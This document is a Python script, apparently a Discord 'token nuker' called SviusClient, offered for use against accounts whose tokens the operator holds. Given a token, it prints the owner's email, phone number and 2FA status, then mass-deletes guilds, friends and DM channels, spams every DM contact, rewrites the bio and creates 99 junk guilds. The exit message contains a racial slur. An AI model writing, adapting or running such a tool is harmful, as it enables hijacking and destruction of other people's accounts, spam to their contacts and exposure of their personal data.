import os, requests, signal, sys
from colorama import Fore

def exit_handler(signal, frame):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + 'Ok, ciao negro!' + Fore.RESET )
    sys.exit(0)

def main(token):
    os.system('cls' if os.name == 'nt' else 'clear')
    userData = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()

    print(Fore.YELLOW + f"""
.▄▄ ·  ▌ ▐·▪  ▄• ▄▌.▄▄ ·  ▄▄· ▄▄▌  ▪  ▄▄▄ . ▐ ▄ ▄▄▄▄▄
▐█ ▀. ▪█·█▌██ █▪██▌▐█ ▀. ▐█ ▌▪██•  ██ ▀▄.▀·•█▌▐█•██  
▄▀▀▀█▄▐█▐█•▐█·█▌▐█▌▄▀▀▀█▄██ ▄▄██▪  ▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪
▐█▄▪▐█ ███ ▐█▌▐█▄█▌▐█▄▪▐█▐███▌▐█▌▐▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·
 ▀▀▀▀ . ▀  ▀▀▀ ▀▀▀  ▀▀▀▀ ·▀▀▀ .▀▀▀ ▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀ 
                                                 
    {Fore.RED + 'CTRL + C for exit'}
    By: {Fore.RED + 'SviusClient 1.2'}

    {Fore.BLUE + 'by @Sverginarla'}

    {Fore.BLUE + 'Token logged in as: ' + Fore.RED + userData['username'] + '#' + userData['discriminator']}                                                          
    """)

    print(Fore.GREEN + """
    
     Option    Title            Description         
    
          1 | Get info    Gets token info and prints 
          2 | Fuck token  Fucks the Discord token    
    
    """)

    opt = input(Fore.YELLOW + 'root@SviusClient:~# ' + Fore.RESET)

    if opt == '1':
        tokenInfo(userData, token)
    elif opt == '2':
        tokenFvcker(userData, token)
    else:
        input(Fore.RESET + 'Invalid option. Press any key to restart...')
        main(token)

def tokenInfo(userData, token):
    print(Fore.RED + f"""
    ------------------------------------
    Token: {token}
    ------------------------------------
    Username: {userData['username'] + '#' + userData['discriminator']}
    ------------------------------------
    ID: {userData['id']}
    ------------------------------------
    Email: {userData['email']}
    ------------------------------------
    Phone Number: {userData['phone']}
    ------------------------------------
    2FA Enabled: {userData['mfa_enabled']}
    ------------------------------------
    """)
    input(Fore.RESET + 'Press any key for turn to main...')
    main(token)

def tokenFvcker(userData, token):
    invite = input(Fore.GREEN + 'https://discord.io/ChaosNetworkClub' + Fore.RESET)
    userGuilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}).json()
    guildIds = []
    userFriends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'Authorization': token}).json()
    userDms = requests.get('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}).json()
    dmIds = []
    friendIds = []
    guildName = input(Fore.RED + 'Type guild name for creating 99 guilds: ' + Fore.RESET)
    message = input(Fore.RED + 'Type the message to send to people DMs: ' + Fore.RESET)
    bio = input(Fore.RED + 'Type the user new biography: ' + Fore.RESET)

    requests.patch('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, json={'bio':bio})

    for guild in userGuilds:
        guildIds.append(guild['id'])

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers={'Authorization': token})

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/guilds/{id}', headers={'Authorization': token})

    for dm in userDms:
        dmIds.append(dm['id'])

    for id in dmIds:
        requests.post(f'https://discord.com/api/v9/channels/{id}/messages', headers={'Authorization': token}, json={'content': message})
        requests.delete(f'https://discord.com/api/v9/channels/{id}', headers={'Authorization': token})

    for friend in userFriends:
        friendIds.append(friend['id'])

    for id in friendIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={'Authorization': token})

    for i in range(99):
        requests.post('https://discord.com/api/v9/guilds', headers={'Authorization': token}, json={'name': guildName, 'region': 'europe'})

    requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})

    input(Fore.RESET + 'Finished. Press any key for returning to menu...')
    main(token)

if __name__ == '__main__':
    os.system('title SviusClient 1.2' if os.name == 'nt' else '')
    os.system('cls' if os.name == 'nt' else 'clear')
    signal.signal(signal.SIGINT, exit_handler)
    token = input(Fore.RED + 'Insert token: ' + Fore.RESET)
    main(token)